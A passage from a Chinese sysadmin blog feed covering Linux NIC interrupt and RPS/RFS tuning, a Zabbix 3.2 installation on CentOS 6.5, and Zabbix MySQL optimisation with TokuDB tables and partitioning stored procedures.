class="line">可以通过top命令查看%si是否均衡分摊到0-7核CPU</div></pre></td></tr></table></figure>
<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><ol>
<li>启动irqbalance后，手动绑定将失效</li>
<li>当CPU工作在最高性能模式时，irqbalance会均匀分配中断到其他CPU，节能模式时中断会集中分配到CPU0</li>
<li>以上设置均以网卡支持多队列为前提，建议手动绑定SMP IRQ affinity</li>
<li>网卡多队列需tg3,bnx2,bnx2x,b44等驱动的支持，Broadcom的网卡驱动已经内置在内核中向后兼容大部分的2.6内核及大于2.4.24的2.4内核</li>
<li>笔者实际测试过程中遇到BladeCenter HS23刀片服务器Emulex Corporation OneConnect 10Gb NIC (be3)本身支持多队列，在连接到千兆网环境下无法使用多队列问题，万兆网络下可以使用，只好通过下面RPS/RFS方式实现</li>
</ol>
<h4 id="RPS-RFS"><a href="#RPS-RFS" class="headerlink" title="RPS/RFS"></a>RPS/RFS</h4><p>Receive Packet Steering/Receive Flow Streering,软件方式实现CPU均衡，接收包中断的优化<br>RPS: 网卡驱动对每一个数据库包根据四元组(SIP,SPORT,DIP,DPORT)生成HASH值,通过HASH值将每个连接和CPU 绑定<br>RFS： 由于RPS只是单纯的把数据包均衡到不同的CPU上，此时如果应用程序所在CPU和中断处理的CPU不在同一个核，将会对CPU Cache影响很大，RFS的作用就是将应用程序和软中断处理分配到同一个CPU<br>配置步骤:</p>
<p>根据上述说明一个十六进制f表示四个CPU核，那么均衡到32核即ffffffff</p>
<h5 id="配置RPS"><a href="#配置RPS" class="headerlink" title="配置RPS"></a>配置RPS</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">rps_cpus=&apos;ffffffffff&apos;</div><div class="line">for rxdir in /sys/class/net/eth0/queues/rx-*</div><div class="line">do</div><div class="line">echo $rps_cpus &gt;$rxdir/rps_cpus</div><div class="line"></div><div class="line">done</div></pre></td></tr></table></figure>
<h5 id="配置RFS"><a href="#配置RFS" class="headerlink" title="配置RFS"></a>配置RFS</h5><p>RFS扩展了RPS的性能以增加CPU缓存命中率，减少网络延迟,默认是禁用的<br>/proc/sys/net/core/rps_sock_flow_entries<br>设置此文件至同时活跃连接数的最大预期值。对于中等服务器负载，推荐值为 32768 。所有输入的值四舍五入至最接近的2的幂<br>/sys/class/net/device/queues/rx-queue/rps_flow_cnt<br>将 device 改为想要配置的网络设备名称（例如，eth0），将 rx-queue 改为想要配置的接收队列名称（例如，rx-0）。<br>将此文件的值设为 rps_sock_flow_entries 除以 N，其中 N 是设备中接收队列的数量。例如，如果 rps_flow_entries 设为 32768，并且有 16 个配置接收队列，那么 rps_flow_cnt 就应设为 2048。对于单一队列的设备，rps_flow_cnt 的值和 rps_sock_flow_entries 的值是一样的`</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">ls /sys/class/net/eth0/queues/rx-*|grep queues|wc -l</div><div class="line">8</div><div class="line">rps_flow_cnt=32768/8=4096</div><div class="line">echo 32768 &gt;/proc/sys/net/core/rps_sock_flow_entries</div><div class="line">for rxdir in /sys/class/net/eth0/queues/rx-*</div><div class="line">do</div><div class="line">echo $rps_cpus &gt;$rxdir/rps_cpus</div><div class="line">echo $rps_flow_cnt &gt;$rxdir/rps_flow_cnt</div><div class="line">done</div><div class="line"></div><div class="line">echo 32768 &gt;/proc/sys/net/core/rps_sock_flow_entries</div></pre></td></tr></table></figure>
<p>优化脚本可参考: <a href="https://github.com/geekwolf/sa-scripts/blob/master/ops-scripts/performance_tuning/set_rps.sh" target="_blank" rel="external">https://github.com/geekwolf/sa-scripts/blob/master/ops-scripts/performance_tuning/set_rps.sh</a></p>
<h4 id="网卡常规优化方案"><a href="#网卡常规优化方案" class="headerlink" title="网卡常规优化方案"></a>网卡常规优化方案</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/2017/02/net_stack.jpg" alt=""><br>关于发包的优化XPS 还未做测试，有时间在做补充！</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
<ul>
<li>TCP/UDP压测工具netperf <a href="https://sanwen8.cn/p/P8bHgn.html" target="_blank" rel="external">https://sanwen8.cn/p/P8bHgn.html</a></li>
<li>多队列网卡及网卡中断绑定阐述 <a href="http://www.ywnds.com/?p=4380" target="_blank" rel="external">http://www.ywnds.com/?p=4380</a></li>
<li>Netperf压测数据分析 <a href="http://www.docin.com/p-1654134152.html" target="_blank" rel="external">http://www.docin.com/p-1654134152.html</a></li>
<li>RHEL7.0 Performance_Tuning_Guide <a href="https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/7/html/Performance_Tuning_Guide/" target="_blank" rel="external">https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/7/html/Performance_Tuning_Guide/</a></li>
<li>RPS/RFS/RSS 性能测试 <a href="http://www.cnblogs.com/Bozh/archive/2013/03/21/2973769.html" target="_blank" rel="external">http://www.cnblogs.com/Bozh/archive/2013/03/21/2973769.html</a></li>
</ul>
</blockquote>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Centos6.5部署Zabbix3.2(备忘)]]></title>
      <url>/2016/12/17/centos-zabbix32-install.html</url>
      <content type="html"><![CDATA[<h4 id="配置yum源"><a href="#配置yum源" class="headerlink" title="配置yum源"></a>配置yum源</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">wget --no-check-certificate http://lug.ustc.edu.cn/wiki/_export/code/mirrors/help/epel?codeblock=0 -O epel.repo</div><div class="line">wget --no-check-certificate http://lug.ustc.edu.cn/wiki/_export/code/mirrors/help/epel?codeblock=1 -O epel-testing.repo</div><div class="line">yum install  -y http://www.percona.com/downloads/percona-release/redhat/0.1-3/percona-release-0.1-3.noarch.rpm</div><div class="line">rpm -Uvh http://mirror.webtatic.com/yum/el6/latest.rpm</div></pre></td></tr></table></figure>
<h4 id="安装LNMP环境及依赖包"><a href="#安装LNMP环境及依赖包" class="headerlink" title="安装LNMP环境及依赖包"></a>安装LNMP环境及依赖包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install nginx Percona-Server-server-57 Percona-Server-client-57 Percona-Server-devel-57 Percona-Server-tokudb-57  php56w php56w-fpm php56w-mysql gcc-c++ libxml2-devel net-snmp-devel  libcurl-devel fping php56w-bcmath php56w-mbstring php56w-gd php56w-xmlwriter php56w-xmlreader</div></pre></td></tr></table></figure>
<h4 id="数据库初始化，支持TokuDB"><a href="#数据库初始化，支持TokuDB" class="headerlink" title="数据库初始化，支持TokuDB"></a>数据库初始化，支持TokuDB</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">数据库初始化</div><div class="line">mysqld --initialize-insecure --user=mysql --datadir=/data/mysql/data/</div><div class="line">启用TokuDB</div><div class="line">ps_tokudb_admin --enable -uroot -pgeekwolf</div><div class="line"></div><div class="line">若无法加载tokudb引擎，请查看huge pages是否关闭：</div><div class="line">echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled</div><div class="line">echo never &gt; /sys/kernel/mm/transparent_hugepage/defrag</div></pre></td></tr></table></figure>
<h4 id="安装Zabbix"><a href="#安装Zabbix" class="headerlink" title="安装Zabbix"></a>安装Zabbix</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">wget https://nchc.dl.sourceforge.net/project/zabbix/ZABBIX%20Latest%20Stable/3.2.2/zabbix-3.2.2.tar.gz</div><div class="line">    groupadd zabbix</div><div class="line">    useradd -g zabbix -s /sbin/nologin</div><div class="line">    tar xf zabbix-3.2.2.tar.gz</div><div class="line">    ./configure --enable-server --enable-agent --with-mysql --enable-ipv6 --with-net-snmp --with-libcurl --with-libxml2</div><div class="line">    make -j8</div><div class="line">    make install</div></pre></td></tr></table></figure>
<h4 id="配置zabbix-agent"><a href="#配置zabbix-agent" class="headerlink" title="配置zabbix_agent"></a>配置zabbix_agent</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">vim /usr/local/etc/zabbix_agentd.conf</div><div class="line">PidFile=/tmp/zabbix_agentd.pid</div><div class="line">LogFile=/tmp/zabbix_agentd.log</div><div class="line">LogFileSize=0</div><div class="line">Server=192.168.1.1</div><div class="line">ServerActive=192.168.1.1</div><div class="line">Hostname=192.168.1.2</div><div class="line">UnsafeUserParameters=1</div></pre></td></tr></table></figure>
<h4 id="配置zabbix-server"><a href="#配置zabbix-server" class="headerlink" title="配置zabbix_server"></a>配置zabbix_server</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">vim /usr/local/etc/zabbix_server.conf</div><div class="line">DBHost=192.168.1.1</div><div class="line">DBName=zabbix</div><div class="line">DBUser=zabbix</div><div class="line">DBPassword=zabbix</div><div class="line">DebugLevel=3</div><div class="line">StartPollers=80</div><div class="line">CacheSize=32M</div><div class="line">TrendCacheSize=32M</div><div class="line">HistoryCacheSize=32M</div><div class="line">LogFile=/tmp/zabbix_server.log</div><div class="line">AlertScriptsPath=/usr/local/etc/scripts</div><div class="line">FpingLocation=/usr/bin/fping</div><div class="line">StartPingers=20</div><div class="line">HousekeepingFrequency=1</div><div class="line">MaxHousekeeperDelete=10000</div><div class="line">Timeout=10</div></pre></td></tr></table></figure>
<h4 id="部署Zabbix-FrontEnd"><a href="#部署Zabbix-FrontEnd" class="headerlink" title="部署Zabbix FrontEnd"></a>部署Zabbix FrontEnd</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">cd  zabbix-3.2.2/</div><div class="line">cp frontends/php/* /usr/share/zabbix/</div><div class="line">chown apache.apache /usr/share/zabbix -R</div><div class="line">mysql&gt;create database zabbix;</div><div class="line">mysql&gt;source database/mysql/schema.sql;</div><div class="line">mysql&gt;source database/mysql/images.sql;</div><div class="line">mysql&gt;source database/mysql/data.sql;</div><div class="line">拷贝启动脚本:</div><div class="line">cp  misc/init.d/fedora/core5/* /etc/rc.d/init.d/</div><div class="line">配置Nginx:</div><div class="line">vim /etc/nginx/conf.d/zabbix.conf</div><div class="line">server &#123;</div><div class="line">    listen 80;</div><div class="line">    server_name zbx.simlinux.com;</div><div class="line">    index index.html index.php;</div><div class="line">    root /usr/share/zabbix;</div><div class="line">    location ~ \.php$ &#123;</div><div class="line">        fastcgi_pass   127.0.0.1:9000;</div><div class="line">        fastcgi_index  index.php;</div><div class="line">        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</div><div class="line">        include        fastcgi_params;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="启动agent和server服务"><a href="#启动agent和server服务" class="headerlink" title="启动agent和server服务"></a>启动agent和server服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">service zabbix_agentd start</div><div class="line">service zabbix_server start</div><div class="line">service nginx reload</div></pre></td></tr></table></figure>
<p>修改php.ini配置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">always_populate_raw_post_data = -1</div><div class="line">max_execution_time = 300</div><div class="line">max_input_time = 300</div><div class="line">data.timezone = PRC </div><div class="line">post_max_size=16M</div><div class="line">service php-fpm reload</div></pre></td></tr></table></figure></p>
<h4 id="修改数据表引擎和创建分区表"><a href="#修改数据表引擎和创建分区表" class="headerlink" title="修改数据表引擎和创建分区表"></a>修改数据表引擎和创建分区表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">alter table history engines=&apos;tokudb&apos;;</div><div class="line">alter table history_log engines=&apos;tokudb&apos;;</div><div class="line">alter table history_str engines=&apos;tokudb&apos;;</div><div class="line">alter table history_text engines=&apos;tokudb&apos;;</div><div class="line">alter table trends engines=&apos;tokudb&apos;;</div></pre></td></tr></table></figure>
<p>分区表可参考<a href="http://blog.simlinux.com/archives/1776.html" target="_blank" rel="external">http://blog.simlinux.com/archives/1776.html</a></p>
<h4 id="安装Zabbix-Web"><a href="#安装Zabbix-Web" class="headerlink" title="安装Zabbix Web"></a>安装Zabbix Web</h4><p>访问<a href="http://192.168.1.1" target="_blank" rel="external">http://192.168.1.1</a> 进行安装,默认账号密码: admin zabbix</p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2016/12/zbx.png" alt=""></p>
<h4 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h4><p>A. Zabbix设置中文显示时，图形部分字体显示方框<br> <img src="http://ow1schdt5.bkt.clouddn.com/2016/12/zbx-q1.png" alt=""></p>
<p>解决方法：<br>Zabbix默认使用DejaVuSan.ttf字体，不支持中文<br>拷贝本地C:\Windows\Fonts下的微软雅黑字体上传到Zabbix Web目录fonts下,即msyh.ttf<br>sed -i ‘s/DejaVuSans/msyh/g’ ./include/defines.inc.php</p>
<p>B. Zabbix_server日志提示20434:20161217:105010.997 fping failed: fping6: Address family for hostname not supported<br>解决方法:<br>zabbix_server.conf中指定fping和fping6路径<br>FpingLocation=/usr/sbin/fping<br>Fping6Location=/usr/sbin/fping6</p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Zabbix数据库优化总结]]></title>
      <url>/2016/12/10/zabbix-mysql-performance.html</url>
      <content type="html"><![CDATA[<blockquote>
<p> <strong>目的:</strong> 快速清理历史数据，并减少数据存储容量<br> <strong>方法</strong>: 历史表使用分区表(删除分区表速度快),使用Tokudb引擎(适合大量insert少量update和select等日志表)</p>
</blockquote>
<h4 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h4><blockquote>
<p><strong>Zabbix版本:</strong> 2.4<br><strong>涉及表项:</strong><br>  存储不同类型item的历史数据，最终1小时或者1天等段时间的绘图数据从其中获取<br>  history、history_log、history_str、history_text、history_uint<br>  存储不同类型item的历史趋势数据，每隔一小时从历史数据中统计一次，并计算统计区间的平均值，最大值，最小值trends、trends_uint</p>
</blockquote>
<h4 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h4><h5 id="关闭zabbix的housekeeper功能"><a href="#关闭zabbix的housekeeper功能" class="headerlink" title="关闭zabbix的housekeeper功能"></a>关闭zabbix的housekeeper功能</h5><p><img src="http://ow1schdt5.bkt.clouddn.com/2016/12/housekeeper.jpg" alt=""></p>
<h5 id="备份原有历史数据表"><a href="#备份原有历史数据表" class="headerlink" title="备份原有历史数据表"></a>备份原有历史数据表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">rename table history to history_bak;</div><div class="line">rename table history_log to history_log_bak;</div><div class="line">rename table history_str to history_str_bak;</div><div class="line">rename table history_text to history_text_bak;</div><div class="line">rename table history_unit to history_unit_bak;</div><div class="line">rename table trends to trends_bak;</div><div class="line">rename table trends_unit to trends_unit_bak;</div></pre></td></tr></table></figure>
<h5 id="创建新表-使用tokudb引擎"><a href="#创建新表-使用tokudb引擎" class="headerlink" title="创建新表(使用tokudb引擎)"></a>创建新表(使用tokudb引擎)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">`CREATE TABLE `history` (</div><div class="line">  `itemid` bigint(20) unsigned NOT NULL,</div><div class="line">  `clock` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `value` double(16,4) NOT NULL DEFAULT &apos;0.0000&apos;,</div><div class="line">  `ns` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  KEY `history_1` (`itemid`,`clock`)</div><div class="line">) ENGINE=Tokudb DEFAULT CHARSET=utf8；</div><div class="line"> CREATE TABLE `history_log` (</div><div class="line">  `id` bigint(20) unsigned NOT NULL,</div><div class="line">  `itemid` bigint(20) unsigned NOT NULL,</div><div class="line">  `clock` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `timestamp` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `source` varchar(64) NOT NULL DEFAULT &apos;&apos;,</div><div class="line">  `severity` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `value` text NOT NULL,</div><div class="line">  `logeventid` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `ns` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  PRIMARY KEY (`id`),</div><div class="line">  UNIQUE KEY `history_log_2` (`itemid`,`id`),</div><div class="line">  KEY `history_log_1` (`itemid`,`clock`)</div><div class="line">) ENGINE=Tokudb DEFAULT CHARSET=utf8；</div><div class="line">CREATE TABLE `history_str` (</div><div class="line">  `itemid` bigint(20) unsigned NOT NULL,</div><div class="line">  `clock` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `value` varchar(255) NOT NULL DEFAULT &apos;&apos;,</div><div class="line">  `ns` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  KEY `history_str_1` (`itemid`,`clock`)</div><div class="line">) ENGINE=Tokudb DEFAULT CHARSET=utf8；</div><div class="line">CREATE TABLE `history_text` (</div><div class="line">  `id` bigint(20) unsigned NOT NULL,</div><div class="line">  `itemid` bigint(20) unsigned NOT NULL,</div><div class="line">  `clock` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `value` text NOT NULL,</div><div class="line">  `ns` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  PRIMARY KEY (`id`),</div><div class="line">  UNIQUE KEY `history_text_2` (`itemid`,`id`),</div><div class="line">  KEY `history_text_1` (`itemid`,`clock`)</div><div class="line">) ENGINE=Tokudb DEFAULT CHARSET=utf8；</div><div class="line">CREATE TABLE `history_uint` (</div><div class="line">  `itemid` bigint(20) unsigned NOT NULL,</div><div class="line">  `clock` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `value` bigint(20) unsigned NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `ns` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  KEY `history_uint_1` (`itemid`,`clock`)</div><div class="line">) ENGINE=Tokudb DEFAULT CHARSET=utf8；</div><div class="line">CREATE TABLE `trends` (</div><div class="line">  `itemid` bigint(20) unsigned NOT NULL,</div><div class="line">  `clock` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `num` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `value_min` double(16,4) NOT NULL DEFAULT &apos;0.0000&apos;,</div><div class="line">  `value_avg` double(16,4) NOT NULL DEFAULT &apos;0.0000&apos;,</div><div class="line">  `value_max` double(16,4) NOT NULL DEFAULT &apos;0.0000&apos;,</div><div class="line">  PRIMARY KEY (`itemid`,`clock`)</div><div class="line">) ENGINE=Tokudb DEFAULT CHARSET=utf8；</div><div class="line">CREATE TABLE `trends_uint` (</div><div class="line">  `itemid` bigint(20) unsigned NOT NULL,</div><div class="line">  `clock` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `num` int(11) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `value_min` bigint(20) unsigned NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `value_avg` bigint(20) unsigned NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `value_max` bigint(20) unsigned NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  PRIMARY KEY (`itemid`,`clock`)</div><div class="line">) ENGINE=Tokudb DEFAULT CHARSET=utf8；</div></pre></td></tr></table></figure>
<h5 id="更改索引结构-新版本无需更改"><a href="#更改索引结构-新版本无需更改" class="headerlink" title="更改索引结构(新版本无需更改)"></a>更改索引结构(新版本无需更改)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ALTER TABLE history_text DROP PRIMARY KEY,</div><div class="line">ADD INDEX (id),</div><div class="line">DROP INDEX history_text_2,</div><div class="line">ADD INDEX history_text_2 (itemid, id);</div><div class="line">ALTER TABLE history_log DROP PRIMARY KEY,</div><div class="line">ADD INDEX (id),</div><div class="line">DROP INDEX history_log_2,</div><div class="line">ADD INDEX history_log_2 (itemid, id);</div></pre></td></tr></table></figure>
<h5 id="创建存储过程"><a href="#创建存储过程" class="headerlink" title="创建存储过程"></a>创建存储过程</h5><blockquote>
<p>partition_create 增加分区存储过程<br>partition_drop 删除分区存储过程<br>partition_maintenance 分区维护(创建删除逻辑)存储过程<br>partition_maintenance_all 分区维护(调用partition_maintenance )<br>partition_verify 检查分区、创建第一个分区的存储过程</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div></pre></td><td class="code"><pre><div class="line">**************************************partition_create**************************************</div><div class="line">DELIMITER $$</div><div class="line">CREATE PROCEDURE `partition_create`(SCHEMANAME varchar(64), TABLENAME varchar(64), PARTITIONNAME varchar(64), CLOCK int)</div><div class="line">BEGIN</div><div class="line">      /*</div><div class="line">         SCHEMANAME = The DB schema in which to make changes</div><div class="line">         TABLENAME = The table with partitions to potentially delete</div><div class="line">         PARTITIONNAME = The name of the partition to create</div><div class="line">      */</div><div class="line">      /*</div><div class="line">         Verify that the partition does not already exist</div><div class="line">      */</div><div class="line"></div><div class="line">      DECLARE RETROWS INT;</div><div class="line">      SELECT COUNT(1) INTO RETROWS</div><div class="line">      FROM information_schema.partitions</div><div class="line">      WHERE table_schema = SCHEMANAME AND table_name = TABLENAME AND partition_description &amp;gt;= CLOCK;</div><div class="line"></div><div class="line">      IF RETROWS = 0 THEN</div><div class="line">              /*</div><div class="line">                 1\. Print a message indicating that a partition was created.</div><div class="line">                 2\. Create the SQL to create the partition.</div><div class="line">                 3\. Execute the SQL from #2.</div><div class="line">              */</div><div class="line">              SELECT CONCAT( &quot;partition_create(&quot;, SCHEMANAME, &quot;,&quot;, TABLENAME, &quot;,&quot;, PARTITIONNAME, &quot;,&quot;, CLOCK, &quot;)&quot; ) AS msg;</div><div class="line">              SET @sql = CONCAT( &apos;ALTER TABLE &apos;, SCHEMANAME, &apos;.&apos;, TABLENAME, &apos; ADD PARTITION (PARTITION &apos;, PARTITIONNAME, &apos; VALUES LESS THAN (&apos;, CLOCK, &apos;));&apos; );</div><div class="line">              PREPARE STMT FROM @sql;</div><div class="line">              EXECUTE STMT;</div><div class="line">              DEALLOCATE PREPARE STMT;</div><div class="line">      END IF;</div><div class="line">END$$</div><div class="line">DELIMITER ;</div><div class="line">**************************************partition_drop**************************************</div><div class="line">DELIMITER $$</div><div class="line">CREATE PROCEDURE `partition_drop`(SCHEMANAME VARCHAR(64), TABLENAME VARCHAR(64), DELETE_BELOW_PARTITION_DATE BIGINT)</div><div class="line">BEGIN</div><div class="line">      /*</div><div class="line">         SCHEMANAME = The DB schema in which to make changes</div><div class="line">         TABLENAME = The table with partitions to potentially delete</div><div class="line">         DELETE_BELOW_PARTITION_DATE = Delete any partitions with names that are dates older than this one (yyyy-mm-dd)</div><div class="line">      */</div><div class="line">      DECLARE done INT DEFAULT FALSE;</div><div class="line">      DECLARE drop_part_name VARCHAR(16);</div><div class="line"></div><div class="line">      /*</div><div class="line">         Get a 